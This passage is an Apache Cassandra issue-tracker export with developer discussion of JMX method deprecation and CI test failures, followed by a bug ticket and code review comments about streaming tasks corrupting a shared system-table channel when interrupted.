Can you, please, do it? Thanks in advance;;;","29/Aug/22 17:24;dcapwell;The patch asks users to ""migrate"" to a new method that does the same thing but fixes the bug... rather than asking users to migrate we should just fix the bug... can we just catch ConfigurationException and throw the new exception without changing the methods?

bq. The breaking change is one very valid point.

The examples found do not document this behavior, so we are not changing the documented APIs but instead fixing a bug in JMX.  There may be some users that talk to JMX and can handle the ConfigurationException and check for it, so they would no longer catch what they expect, but that was also an internal detail that they are depending on...  The only cases I remember where we asked users to migrate to the new methods were when the methods actually documented this behavior...;;;","29/Aug/22 18:06;e.dimitrova;I am pretty sure we said we shouldn’t break users in long ago released versions for those exceptions. Also, whoever doesn’t want to migrate will keep on using the old ones.  But also people will be using tools that were broken before. There is choice.

Yes, it is not documented in the API but if it breaks someone’s tools in a patch release and we know it It is not nice to break them if it was there for years. 
Another suggestion is to keep the deprecation in old branches and only fix in 4.1/trunk?  WDYT? That I would accept after being well documented;;;","29/Aug/22 18:16;dcapwell;bq. Yes, it is not documented in the API but if it breaks someone’s tools in a patch release and we know it It is not nice to break them if it was there for years. 
bq. Another suggestion is to keep the deprecation in old branches and only fix in 4.1/trunk?  WDYT? That I would accept after being well documented

Older branches are for critical bug fixes, so I feel that we should leave them be for now (and not mark @Deprecated there), I can be more neutral to adding to trunk but not sure I even agree with 4.1....  

If we limit the patch to only trunk, I am +0 to the idea...  not a fan but get the point about breaking anyone who used the undocumented behavior...;;;","29/Aug/22 18:28;e.dimitrova;If it is only trunk  probably it is fine to just fix it there. But I know we didn’t fix those before as we wanted to fix them in the older versions too. So I am a bit confused now, but I also understand your point… I wanted to go for the deprecation because of the old versions;;;","30/Aug/22 23:12;dcapwell;bq. If it is only trunk  probably it is fine to just fix it there

If the concern is backwards compatibility then the arguments don't go away because its trunk... I am cool fixing or adding new and marking old as Deprecated; will leave it up to [~e.dimitrova] and [~lmtrombone].

bq.  I wanted to go for the deprecation because of the old versions

Well, I guess I would ask ""when do we want to remove them?""  To me trunk is currently 4.2 so earliest we could drop is 5.0 (or was it 6.0? Forget exactly what we agreed in terms of minor and Deprecated)... back porting to add the Deprecated doesn't change that...;;;","31/Aug/22 04:53;lmtrombone;I don't really have a preference and am okay with whatever we decide ;;;","02/Sep/22 15:44;e.dimitrova;It seems the decision will be on me, then trunk with deprecation and be nice to our end users. 
{quote}Well, I guess I would ask ""when do we want to remove them?"" To me trunk is currently 4.2 so earliest we could drop is 5.0 (or was it 6.0? Forget exactly what we agreed in terms of minor and Deprecated)... back porting to add the Deprecated doesn't change that...
{quote}
Very good question that I also struggle with sometimes... In general we would say deprecate, keep in 5, remove in 6. Although, I see people keep on deprecating and when it comes to just method or config parameter it seems they prefer to keep it without deadline. So I am not sure. I guess in this case it will depend until when we keep JMX around too. I guess that will be the main guideline in this case. ;;;","02/Sep/22 16:20;dcapwell;bq. then trunk with deprecation 

Works for me.;;;","02/Sep/22 16:26;dcapwell;Overall I am +1 to https://github.com/apache/cassandra/pull/1788 if we add comments explaining why we have 2 methods with identical bodies... ;;;","03/Sep/22 01:36;lmtrombone;Ok, sounds good to me.  I closed the pull requests for the other branches, rebased the trunk MR, and added comments to the getters with duplicate bodies.;;;","06/Sep/22 23:52;dcapwell;+1;;;","07/Sep/22 15:49;e.dimitrova;Thanks, I just pushed it rebased with the last 6 commits from trunk into Jenkins. (a few days passed, sorry about that)

There is a limit on number of Jenkins dev runs in parallel which is currently reached so it will take time to start but it should be #1913 [here|https://jenkins-cm4.apache.org/view/patches/job/Cassandra-devbranch/];;;","08/Sep/22 15:02;e.dimitrova;It started but it is still running... seems like Jenkins is very busy these days. Will check back again later;;;","08/Sep/22 17:43;lmtrombone;No worries, that's fine with me.   I'll try periodically checking it too for when it completes;;;","09/Sep/22 07:10;lmtrombone;Looks like the run finally completed and there are some failures.  A few of them are the intermittent failures that have been actively discussed in https://issues.apache.org/jira/browse/CASSANDRA-17461 :D.   For the remaining failures though, from what I can tell from a glance, there are only one or two tests that are potentially related to the changes made in this ticket.  I'll try to take a closer look tomorrow to try to confirm if this is the case.;;;","09/Sep/22 22:28;e.dimitrova;Great! Let me know if you have any questions. Also, not sure whether you know about [Butler|https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-trunk/trunk], you can consult it together with Jira(in case there was already a ticket opened but not linked in Butler yet). It shows a history of the latest test failures per branch(I shared the link for trunk) and you can click on the links to check the actual error in Jira for the respective run.;;;","14/Sep/22 06:38;lmtrombone;As far as I can tell, I still think the failures are unassociated with my changes.  Here's what I found on the failures though:

The following tests has ticket associated with them
|| || ||
|dtest.configuration_test.TestConfiguration.test_change_durable_writes|https://issues.apache.org/jira/browse/CASSANDRA-17872|
|org.apache.cassandra.net.ConnectionTest.testMessageDeliveryOnReconnect-compression|https://issues.apache.org/jira/browse/CASSANDRA-16677|
|org.apache.cassandra.distributed.test.CASTest.testSucccessfulWriteDuringRangeMovementFollowedByRead
org.apache.cassandra.distributed.test.CASTest.testSuccessfulWriteBeforeRangeMovement
org.apache.cassandra.distributed.test.CASTest.testConflictingWritesWithStaleRingInformation|https://issues.apache.org/jira/browse/CASSANDRA-17461|

 
----
 

The following failures don't have tickets associated with them, but has been marked flaky one way or another
|| || ||
|dtest.materialized_views_test.TestMaterializedViews.test_no_base_column_in_view_pk_complex_timestamp_with_flush|Consistently passing on Cassandra CI and locally too, but apparently has a flaky annotation added some time ago|
|org.apache.cassandra.net.ProxyHandlerConnectionsTest.testExpireSome-cdc|Has 'Flaky' tag on Butler and has history of flakiness|

 
----
 

The following failures don't have any markings on them, but in the test results, it seems we might be running some of the tests twice?  Not sure if this is a sign of flakiness, since it's a sample size of 2.  I was not able find anything wrong from running them repeatedly locally either:
 * org.apache.cassandra.distributed.test.metrics.StreamingMetricsTest.testMetricsWithRepairAndStreamingToTwoNodes
 * org.apache.cassandra.distributed.test.UnableToParseClientMessageTest.badHeader[version=3/v3]
 * org.apache.cassandra.distributed.test.repair.ForceRepairTest.forceWithDifference

!Screen Shot 2022-09-13 at 11.27.30 PM.png!

 
----
 

BinAuditLoggerTest.testSelectRoundTripQuery-compression - no idea at all.  It does seem to pass consistently locally too.;;;","23/Sep/22 22:04;e.dimitrova;Hi [~lmtrombone] ,

I agree with your analysis plus I am adding the following to confirm your patch has nothing to do with the failures we saw:
 * [test_no_base_column_in_view_pk_complex_timestamp_with_flush|https://jenkins-cm4.apache.org/view/patches/job/Cassandra-devbranch/1913/testReport/junit/dtest.materialized_views_test/TestMaterializedViews/test_no_base_column_in_view_pk_complex_timestamp_with_flush/] - I fixed this one already in another ticket
 * testMetricsWithRepairAndStreamingToTwoNodes – seen in CASSANDRA-17608
 * badHeader - CASSANDRA-17488
 * forceWitDifference - seen in CASSANDRA-17566

As it's been some time since we ran that CI, I just did a [rebase|https://github.com/ekaterinadimitrova2/cassandra/tree/CASSANDRA-17668] and started final [CI run|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=CASSANDRA-17668]. I will check that one later and commit, overall I do not expect surprises.;;;","25/Sep/22 03:56;lmtrombone;Sounds good to me.  Thanks [~e.dimitrova] !;;;","26/Sep/22 15:42;e.dimitrova;Committed to trunk:

To [https://github.com/apache/cassandra.git]

   7adfdc85cf..e5c9cf4cbe  trunk -> trunk

The only issues seen were known:

test_move_backwards_and_cleanup - CASSANDRA-16061

test_multiple_repair - CASSANDRA-17005

Also, for the record - I didn't run in the multiplexer the unit tests because they cannot be more deterministic than that. Saved some resources here. 

Thank you for your work [~lmtrombone]!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Ensure FileStreamTask cannot compromise shared channel proxy for system table when interrupted,CASSANDRA-17663,13446872,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,maedhroz,maedhroz,maedhroz,25/May/22 17:42,29/Mar/23 20:42,13/Jul/23 08:40,02/Jun/22 17:27,4.0.5,4.1,4.1-beta1,,,,Consistency/Repair,Consistency/Streaming,,,0,,"This is very similar to what we fixed in CASSANDRA-17466 , just in a different part of the repair/streaming machine.

{{NettyStreamingMessageSender}} is responsible for dispatching {{FileStreamTask}} on an executor it manages to stream files to its peers. When the sender is closed for any reason, like perhaps a peer blowing up while deserializing the stream, the executor it manages is shut down w/ interruption (i.e. {{shutdownNow()}}). This is problematic if we happen to have not gotten very far along in {{FileStreamTask#run()}}. If we're just about to call {{getOrCreateChannel()}}, which reads from the {{peers_v2}} system table, the {{ChannelProxy}} read will throw a {{ClosedByInterruptedException}} and the proxy will be useless. The twist is that, since CASSANDRA-15666, this exception has essentially been swallowed by {{FileStreamTask}}'s exception handling. So we don't see a {{ClosedByInterruptedException}} in the logs, but we do have things like this pop up when anything else tries to hit the peers table:

{noformat}
ERROR 2022-05-19T21:49:23,218 [AntiEntropyStage:1] org.apache.cassandra.service.CassandraDaemon:601 - Exception in thread Thread[AntiEntropyStage:1,5,main]
java.lang.RuntimeException: FSReadError in .../data/system/peers_v2-c4325fbb8e5e3bafbd070f9250ed818e/system-peers_v2-nb-101-big-Data.db
        at org.apache.cassandra.net.InboundSink.accept(InboundSink.java:108) 
        at org.apache.cassandra.net.InboundSink.accept(InboundSink.java:45)
        at org.apache.cassandra.net.InboundMessageHandler$ProcessMessage.run(InboundMessageHandler.java:433)
        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515) 
        at java.util.concurrent.FutureTask.run(FutureTask.java:264)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) [netty-all-4.1.58.Final.jar:4.1.58.Final]
        at java.lang.Thread.run(Thread.java:834)
Caused by: org.apache.cassandra.io.FSReadError: java.nio.channels.ClosedChannelException
        at org.apache.cassandra.io.util.ChannelProxy.read(ChannelProxy.java:143) 
        at org.apache.cassandra.io.util.CompressedChunkReader$Standard.readChunk(CompressedChunkReader.java:115) 
        at org.apache.cassandra.io.util.BufferManagingRebufferer.rebuffer(BufferManagingRebufferer.java:79) 
        at org.apache.cassandra.io.util.RandomAccessReader.reBufferAt(RandomAccessReader.java:68) 
        at org.apache.cassandra.io.util.RandomAccessReader.seek(RandomAccessReader.java:210) 
        at org.apache.cassandra.io.util.FileHandle.createReader(FileHandle.java:151) 
{noformat}

...and...

{noformat}
ERROR 2022-05-19T22:06:20,175 [CompactionExecutor:12] org.apache.cassandra.service.CassandraDaemon:601 - Exception in thread Thread[CompactionExecutor:12,1,main]
org.apache.cassandra.io.FSReadError: java.nio.channels.ClosedChannelException
        at org.apache.cassandra.io.util.ChannelProxy.read(ChannelProxy.java:143) 
        at org.apache.cassandra.io.util.CompressedChunkReader$Standard.readChunk(CompressedChunkReader.java:115) 
        at org.apache.cassandra.io.util.BufferManagingRebufferer.rebuffer(BufferManagingRebufferer.java:79) 
        at org.apache.cassandra.io.util.RandomAccessReader.reBufferAt(RandomAccessReader.java:68) 
        at org.apache.cassandra.io.util.RandomAccessReader.seek(RandomAccessReader.java:210) 
        at org.apache.cassandra.io.sstable.format.big.BigTableScanner.seekToCurrentRangeStart(BigTableScanner.java:196) 
        at org.apache.cassandra.io.sstable.format.big.BigTableScanner.access$400(BigTableScanner.java:52) 
        at org.apache.cassandra.io.sstable.format.big.BigTableScanner$KeyScanningIterator.computeNext(BigTableScanner.java:305) 
        at org.apache.cassandra.io.sstable.format.big.BigTableScanner$KeyScanningIterator.computeNext(BigTableScanner.java:282) 
        at org.apache.cassandra.utils.AbstractIterator.hasNext(AbstractIterator.java:46) 
        at org.apache.cassandra.io.sstable.format.big.BigTableScanner.hasNext(BigTableScanner.java:261) 
{noformat}

...which obviously get us into trouble w/ the disk failure policy.

The fix proposed here is just to get the peers table read out of the thread that can be interrupted. Specifically, {{NettyStreamingMessageSender}} materializes a {{connectTo}} address at stream task creation time. This seemed a better option than making shutdown non-interrupting, since that would mean changing how the actual file streaming responds to shutdown.",,dcapwell,jonmeredith,maedhroz,,,,,,,,,,,,"maedhroz commented on PR #1647:
URL: https://github.com/apache/cassandra/pull/1647#issuecomment-1137893144

   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17663-4.0&filter=all


;25/May/22 22:11;githubbot;600","maedhroz commented on PR #1647:
URL: https://github.com/apache/cassandra/pull/1647#issuecomment-1137951416

   J11 tests hit [CASSANDRA-17139](https://issues.apache.org/jira/browse/CASSANDRA-17139)


;25/May/22 23:27;githubbot;600","maedhroz commented on PR #1647:
URL: https://github.com/apache/cassandra/pull/1647#issuecomment-1138086349

   J8 tests hit [CASSANDRA-17213](https://issues.apache.org/jira/browse/CASSANDRA-17213)


;26/May/22 02:45;githubbot;600","maedhroz commented on PR #1647:
URL: https://github.com/apache/cassandra/pull/1647#issuecomment-1138776508

   Failures in `TestCQLNodes3RF3_Upgrade_current_3_11_x_To_indev_4_0_x` look preexisting...
   
   https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.0/cassandra-4.0


;26/May/22 16:48;githubbot;600","maedhroz commented on PR #1649:
URL: https://github.com/apache/cassandra/pull/1649#issuecomment-1138880321

   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17663-trunk&filter=all


;26/May/22 18:21;githubbot;600","dcapwell commented on code in PR #1648:
URL: https://github.com/apache/cassandra/pull/1648#discussion_r882969976


##########
src/java/org/apache/cassandra/streaming/async/StreamingMultiplexedChannel.java:
##########
@@ -202,7 +210,9 @@ public Future<?> sendMessage(StreamingChannel channel, StreamMessage message)
                 throw new RuntimeException(""Cannot send stream data messages for preview streaming sessions"");
             if (logger.isDebugEnabled())
                 logger.debug(""{} Sending {}"", createLogTag(session), message);
-            return fileTransferExecutor.submit(new FileStreamTask((OutgoingStreamMessage)message));
+
+            InetAddressAndPort connectTo = SystemKeyspace.getPreferredIP(to);

Review Comment:
   do we know If there are any paths where this is called on a Netty thread?



##########
src/java/org/apache/cassandra/streaming/StreamingChannel.java:
##########
@@ -49,6 +49,14 @@ public static void unsafeSet(StreamingChannel.Factory factory)
         }
 
         StreamingChannel create(InetSocketAddress to, int messagingVersion, Kind kind) throws IOException;
+
+        default StreamingChannel create(InetSocketAddress to,
+                                        InetSocketAddress preferred,
+                                        int messagingVersion,
+                                        StreamingChannel.Kind kind) throws IOException
+        {
+            throw new UnsupportedOperationException();

Review Comment:
   so fail if `BulkLoadConnectionFactory`?



##########
test/distributed/org/apache/cassandra/distributed/test/RepairErrorsTest.java:
##########
@@ -124,18 +128,58 @@ public void testRemoteSyncFailure() throws Exception
             result = cluster.get(1).nodetoolResult(""repair"", KEYSPACE);
             result.asserts().success();
 
-            // Make sure we've cleaned up sessions and parent sessions:
-            Integer parents = cluster.get(1).callOnInstance(() -> ActiveRepairService.instance.parentRepairSessionCount());
-            assertEquals(0, parents.intValue());
-            Integer sessions = cluster.get(1).callOnInstance(() -> ActiveRepairService.instance.sessionCount());
-            assertEquals(0, sessions.intValue());
+            assertNoActiveRepairSessions(cluster.get(1));
 
             cluster.forEach(i -> Assertions.assertThat(i.logs().grep(""SomeRepairFailedException"").getResult())
                                            .describedAs(""node%d logged hidden exception org.apache.cassandra.repair.SomeRepairFailedException"", i.config().num())
                                            .isEmpty());
         }
     }
 
+    @Test
+    public void testRemoteStreamFailure() throws Exception
+    {
+        try (Cluster cluster = init(Cluster.build(3)
+                                           .withConfig(config -> config.with(GOSSIP)

Review Comment:
   nit, `GOSSIP, NETWORK`



;26/May/22 18:48;githubbot;600","maedhroz commented on code in PR #1648:
URL: https://github.com/apache/cassandra/pull/1648#discussion_r882979798


##########
src/java/org/apache/cassandra/streaming/StreamingChannel.java:
##########
@@ -49,6 +49,14 @@ public static void unsafeSet(StreamingChannel.Factory factory)
         }
 
         StreamingChannel create(InetSocketAddress to, int messagingVersion, Kind kind) throws IOException;
+
+        default StreamingChannel create(InetSocketAddress to,
+                                        InetSocketAddress preferred,
+                                        int messagingVersion,
+                                        StreamingChannel.Kind kind) throws IOException
+        {
+            throw new UnsupportedOperationException();

Review Comment:
   `BulkLoadConnectionFactory extends NettyStreamingConnectionFactory` right?



;26/May/22 18:58;githubbot;600","maedhroz commented on code in PR #1648:
URL: https://github.com/apache/cassandra/pull/1648#discussion_r882984802


##########
src/java/org/apache/cassandra/streaming/async/StreamingMultiplexedChannel.java:
##########
@@ -202,7 +210,9 @@ public Future<?> sendMessage(StreamingChannel channel, StreamMessage message)
                 throw new RuntimeException(""Cannot send stream data messages for preview streaming sessions"");
             if (logger.isDebugEnabled())
                 logger.debug(""{} Sending {}"", createLogTag(session), message);
-            return fileTransferExecutor.submit(new FileStreamTask((OutgoingStreamMessage)message));
+
+            InetAddressAndPort connectTo = SystemKeyspace.getPreferredIP(to);

Review Comment:
   `StreamSession#startStreamingFiles()` is the only thing that can call `sendMessage()` here with a `OutgoingStreamMessage`. I don't think we can hit that from an even loop thread, but I'll do a quick audit...



;26/May/22 19:05;githubbot;600","maedhroz commented on code in PR #1648:
URL: https://github.com/apache/cassandra/pull/1648#discussion_r882985172


##########
test/distributed/org/apache/cassandra/distributed/test/RepairErrorsTest.java:
##########
@@ -124,18 +128,58 @@ public void testRemoteSyncFailure() throws Exception
             result = cluster.get(1).nodetoolResult(""repair"", KEYSPACE);
             result.asserts().success();
 
-            // Make sure we've cleaned up sessions and parent sessions:
-            Integer parents = cluster.get(1).callOnInstance(() -> ActiveRepairService.instance.parentRepairSessionCount());
-            assertEquals(0, parents.intValue());
-            Integer sessions = cluster.get(1).callOnInstance(() -> ActiveRepairService.instance.sessionCount());
-            assertEquals(0, sessions.intValue());
+            assertNoActiveRepairSessions(cluster.get(1));
 
             cluster.forEach(i -> Assertions.assertThat(i.logs().grep(""SomeRepairFailedException"").getResult())
                                            .describedAs(""node%d logged hidden exception org.apache.cassandra.repair.SomeRepairFailedException"", i.config().num())
                                            .isEmpty());
         }
     }
 
+    @Test
+    public void testRemoteStreamFailure() throws Exception
+    {
+        try (Cluster cluster = init(Cluster.build(3)
+                                           .withConfig(config -> config.with(GOSSIP)

Review Comment:
   ah, TIL



;26/May/22 19:05;githubbot;600","maedhroz commented on code in PR #1648:
URL: https://github.com/apache/cassandra/pull/1648#discussion_r883086006


##########
src/java/org/apache/cassandra/streaming/async/StreamingMultiplexedChannel.java:
##########
@@ -202,7 +210,9 @@ public Future<?> sendMessage(StreamingChannel channel, StreamMessage message)
                 throw new RuntimeException(""Cannot send stream data messages for preview streaming sessions"");
             if (logger.isDebugEnabled())
                 logger.debug(""{} Sending {}"", createLogTag(session), message);
-            return fileTransferExecutor.submit(new FileStreamTask((OutgoingStreamMessage)message));
+
+            InetAddressAndPort connectTo = SystemKeyspace.getPreferredIP(to);

Review Comment:
   Yeah, this only happens in `Stream-Deserializer` threads running `StreamDeserializingTask`s (responding to `PREPARE_SYNACK` and `PREPARE_ACK`).



;26/May/22 21:10;githubbot;600","maedhroz commented on code in PR #1648:
URL: https://github.com/apache/cassandra/pull/1648#discussion_r883105776


##########
src/java/org/apache/cassandra/streaming/StreamingChannel.java:
##########
@@ -49,6 +49,14 @@ public static void unsafeSet(StreamingChannel.Factory factory)
         }
 
         StreamingChannel create(InetSocketAddress to, int messagingVersion, Kind kind) throws IOException;
+
+        default StreamingChannel create(InetSocketAddress to,
+                                        InetSocketAddress preferred,
+                                        int messagingVersion,
+                                        StreamingChannel.Kind kind) throws IOException
+        {
+            throw new UnsupportedOperationException();

Review Comment:
   Ah, but we still need to provide differentiated behavior in the `BulkLoadConnectionFactory` version or `create()`.



;26/May/22 21:43;githubbot;600","jonmeredith commented on code in PR #1648:
URL: https://github.com/apache/cassandra/pull/1648#discussion_r883120660


##########
src/java/org/apache/cassandra/streaming/async/StreamingMultiplexedChannel.java:
##########
@@ -155,21 +155,29 @@ private void setupControlMessageChannel() throws IOException
              *  b) for streaming receiver (note: both initiator and follower can receive streaming files) to reveive files,
              *     in {@link Handler#setupStreamingPipeline}
              */
-            controlChannel = createChannel(StreamingChannel.Kind.CONTROL);
+            controlChannel = createControlChannel();
         }
     }
 
-    private StreamingChannel createChannel(StreamingChannel.Kind kind) throws IOException
+    private StreamingChannel createControlChannel() throws IOException
     {
         logger.debug(""Creating stream session to {} as {}"", to, session.isFollower() ? ""follower"" : ""initiator"");
 
-        StreamingChannel channel = factory.create(to, messagingVersion, kind);
-        if (kind == StreamingChannel.Kind.CONTROL)
-        {
-            executorFactory().startThread(String.format(""Stream-Deserializer-%s-%s"", to.toString(), channel.id()),
-                                          new StreamDeserializingTask(session, channel, messagingVersion));
-            session.attachInbound(channel);
-        }
+        StreamingChannel channel = factory.create(to, messagingVersion, StreamingChannel.Kind.CONTROL);
+        executorFactory().startThread(String.format(""Stream-Deserializer-%s-%s"", to.toString(), channel.id()),
+                                      new StreamDeserializingTask(session, channel, messagingVersion));
+        session.attachInbound(channel);
+        session.attachOutbound(channel);
+
+        logger.debug(""Creating {}"", channel.description());
+        return channel;
+    }
+    
+    private StreamingChannel createFileChannel(InetAddressAndPort connectTo) throws IOException
+    {
+        logger.debug(""Creating stream session to {} as {}"", to, session.isFollower() ? ""follower"" : ""initiator"");
+
+        StreamingChannel channel = factory.create(to, connectTo, messagingVersion, StreamingChannel.Kind.FILE);
         session.attachOutbound(channel);
 
         logger.debug(""Creating {}"", channel.description());

Review Comment:
   Similarly `Creating file {}`



##########
src/java/org/apache/cassandra/streaming/async/StreamingMultiplexedChannel.java:
##########
@@ -155,21 +155,29 @@ private void setupControlMessageChannel() throws IOException
              *  b) for streaming receiver (note: both initiator and follower can receive streaming files) to reveive files,
              *     in {@link Handler#setupStreamingPipeline}
              */
-            controlChannel = createChannel(StreamingChannel.Kind.CONTROL);
+            controlChannel = createControlChannel();
         }
     }
 
-    private StreamingChannel createChannel(StreamingChannel.Kind kind) throws IOException
+    private StreamingChannel createControlChannel() throws IOException
     {
         logger.debug(""Creating stream session to {} as {}"", to, session.isFollower() ? ""follower"" : ""initiator"");
 
-        StreamingChannel channel = factory.create(to, messagingVersion, kind);
-        if (kind == StreamingChannel.Kind.CONTROL)
-        {
-            executorFactory().startThread(String.format(""Stream-Deserializer-%s-%s"", to.toString(), channel.id()),
-                                          new StreamDeserializingTask(session, channel, messagingVersion));
-            session.attachInbound(channel);
-        }
+        StreamingChannel channel = factory.create(to, messagingVersion, StreamingChannel.Kind.CONTROL);
+        executorFactory().startThread(String.format(""Stream-Deserializer-%s-%s"", to.toString(), channel.id()),
+                                      new StreamDeserializingTask(session, channel, messagingVersion));
+        session.attachInbound(channel);
+        session.attachOutbound(channel);
+
+        logger.debug(""Creating {}"", channel.description());

Review Comment:
   As we know the difference, might be kind to log `Creating control {}`



##########
src/java/org/apache/cassandra/streaming/StreamingChannel.java:
##########
@@ -49,6 +49,14 @@ public static void unsafeSet(StreamingChannel.Factory factory)
         }
 
         StreamingChannel create(InetSocketAddress to, int messagingVersion, Kind kind) throws IOException;
+
+        default StreamingChannel create(InetSocketAddress to,
+                                        InetSocketAddress preferred,
+                                        int messagingVersion,
+                                        StreamingChannel.Kind kind) throws IOException
+        {
+            throw new UnsupportedOperationException();

Review Comment:
   Why provide the default interface method? Are there cases where you wouldn't implement this?



;26/May/22 22:33;githubbot;600","maedhroz commented on PR #1649:
URL: https://github.com/apache/cassandra/pull/1649#issuecomment-1139260294

   Trunk tests hit [CASSANDRA-17144](https://issues.apache.org/jira/browse/CASSANDRA-17144)


;27/May/22 04:12;githubbot;600","maedhroz commented on code in PR #1648:
URL: https://github.com/apache/cassandra/pull/1648#discussion_r883256761


##########
src/java/org/apache/cassandra/streaming/StreamingChannel.java:
##########
@@ -49,6 +49,14 @@ public static void unsafeSet(StreamingChannel.Factory factory)
         }
 
         StreamingChannel create(InetSocketAddress to, int messagingVersion, Kind kind) throws IOException;
+
+        default StreamingChannel create(InetSocketAddress to,
+                                        InetSocketAddress preferred,
+                                        int messagingVersion,
+                                        StreamingChannel.Kind kind) throws IOException
+        {
+            throw new UnsupportedOperationException();

Review Comment:
   Check the latest commit. There probably would have been an issue for the channel factory we create in `DirectStreamingConnectionFactory`.



;27/May/22 04:15;githubbot;600","maedhroz commented on code in PR #1648:
URL: https://github.com/apache/cassandra/pull/1648#discussion_r883256761


##########
src/java/org/apache/cassandra/streaming/StreamingChannel.java:
##########
@@ -49,6 +49,14 @@ public static void unsafeSet(StreamingChannel.Factory factory)
         }
 
         StreamingChannel create(InetSocketAddress to, int messagingVersion, Kind kind) throws IOException;
+
+        default StreamingChannel create(InetSocketAddress to,
+                                        InetSocketAddress preferred,
+                                        int messagingVersion,
+                                        StreamingChannel.Kind kind) throws IOException
+        {
+            throw new UnsupportedOperationException();

Review Comment:
   Check the latest commit. There probably would have been an issue for the channel factory we create in `DirectStreamingConnectionFactory`. The default behavior of ignoring the ""preferred"" address is, I think, what we want for the simulator (which creates direct channels) and the other test usage (which just want to blow up in someone calls `create()`).



;27/May/22 04:17;githubbot;600","maedhroz commented on PR #1649:
URL: https://github.com/apache/cassandra/pull/1649#issuecomment-1139263623

   ...also hit [CASSANDRA-17573](https://issues.apache.org/jira/browse/CASSANDRA-17573)


;27/May/22 04:22;githubbot;600","jonmeredith commented on code in PR #1649:
URL: https://github.com/apache/cassandra/pull/1649#discussion_r886203192


##########
test/distributed/org/apache/cassandra/distributed/test/RepairErrorsTest.java:
##########
@@ -124,18 +128,57 @@ public void testRemoteSyncFailure() throws Exception
             result = cluster.get(1).nodetoolResult(""repair"", KEYSPACE);
             result.asserts().success();
 
-            // Make sure we've cleaned up sessions and parent sessions:
-            Integer parents = cluster.get(1).callOnInstance(() -> ActiveRepairService.instance.parentRepairSessionCount());
-            assertEquals(0, parents.intValue());
-            Integer sessions = cluster.get(1).callOnInstance(() -> ActiveRepairService.instance.sessionCount());
-            assertEquals(0, sessions.intValue());
+            assertNoActiveRepairSessions(cluster.get(1));
 
             cluster.forEach(i -> Assertions.assertThat(i.logs().grep(""SomeRepairFailedException"").getResult())
                                            .describedAs(""node%d logged hidden exception org.apache.cassandra.repair.SomeRepairFailedException"", i.config().num())
                                            .isEmpty());
         }
     }
 
+    @Test
+    public void testRemoteStreamFailure() throws Exception
+    {
+        try (Cluster cluster = init(Cluster.build(3)
+                                           .withConfig(config -> config.with(GOSSIP)

Review Comment:
   nit: Do you mind adding a comment why NETWORK is not needed for a test that looks like it needs streaming for repair to work?  I think the answer is because it isn't necessary for the test as ByteBuddy intercepts.



;31/May/22 23:28;githubbot;600","maedhroz commented on code in PR #1649:
URL: https://github.com/apache/cassandra/pull/1649#discussion_r886304473


##########
test/distributed/org/apache/cassandra/distributed/test/RepairErrorsTest.java:
##########
@@ -124,18 +128,57 @@ public void testRemoteSyncFailure() throws Exception
             result = cluster.get(1).nodetoolResult(""repair"", KEYSPACE);
             result.asserts().success();
 
-            // Make sure we've cleaned up sessions and parent sessions:
-            Integer parents = cluster.get(1).callOnInstance(() -> ActiveRepairService.instance.parentRepairSessionCount());
-            assertEquals(0, parents.intValue());
-            Integer sessions = cluster.get(1).callOnInstance(() -> ActiveRepairService.instance.sessionCount());
-            assertEquals(0, sessions.intValue());
+            assertNoActiveRepairSessions(cluster.get(1));
 
             cluster.forEach(i -> Assertions.assertThat(i.logs().grep(""SomeRepairFailedException"").getResult())
                                            .describedAs(""node%d logged hidden exception org.apache.cassandra.repair.SomeRepairFailedException"", i.config().num())
                                            .isEmpty());
         }
     }
 
+    @Test
+    public void testRemoteStreamFailure() throws Exception
+    {
+        try (Cluster cluster = init(Cluster.build(3)
+                                           .withConfig(config -> config.with(GOSSIP)

Review Comment:
   I did this to see if removing Netty from the picture would address the sporadic timeouts I've been seeing in the new test. (See https://app.circleci.com/pipelines/github/maedhroz/cassandra/423/workflows/b75a23b0-212a-444c-9f18-65ae90ea0eae/jobs/3376/tests#failed-test-0)
   
   Turns out there's a deadlock that can prevent test completion. From a local test run that hung...
   
   ```
   Found one Java-level deadlock:
   =============================
   ""node1_StreamReceiveTask:1"":
     waiting to lock monitor 0x00007fee7ea233d8 (object 0x00000003ebf78b78, a org.apache.cassandra.repair.LocalSyncTask),
     which is held by ""node1_RepairJobTask:3""
   ""node1_RepairJobTask:3"":
     waiting to lock monitor 0x00007fef0db20a28 (object 0x00000003ebe72618, a org.apache.cassandra.streaming.StreamSession),
     which is held by ""node1_StreamReceiveTask:1""
   
   Java stack information for the threads listed above:
   ===================================================
   ""node1_StreamReceiveTask:1"":
           at org.apache.cassandra.repair.LocalSyncTask.onSuccess(LocalSyncTask.java:158)
           - waiting to lock <0x00000003ebf78b78> (a org.apache.cassandra.repair.LocalSyncTask)
           at org.apache.cassandra.repair.LocalSyncTask.onSuccess(LocalSyncTask.java:48)
           at org.apache.cassandra.utils.concurrent.ListenerList$CallbackListener.run(ListenerList.java:212)
           at org.apache.cassandra.concurrent.ImmediateExecutor.execute(ImmediateExecutor.java:140)
           at org.apache.cassandra.utils.concurrent.ListenerList.safeExecute(ListenerList.java:166)
           at org.apache.cassandra.utils.concurrent.ListenerList.notifyListener(ListenerList.java:157)
           at org.apache.cassandra.utils.concurrent.ListenerList$CallbackListener.notifySelf(ListenerList.java:219)
           at org.apache.cassandra.utils.concurrent.ListenerList.lambda$notifyExclusive$0(ListenerList.java:124)
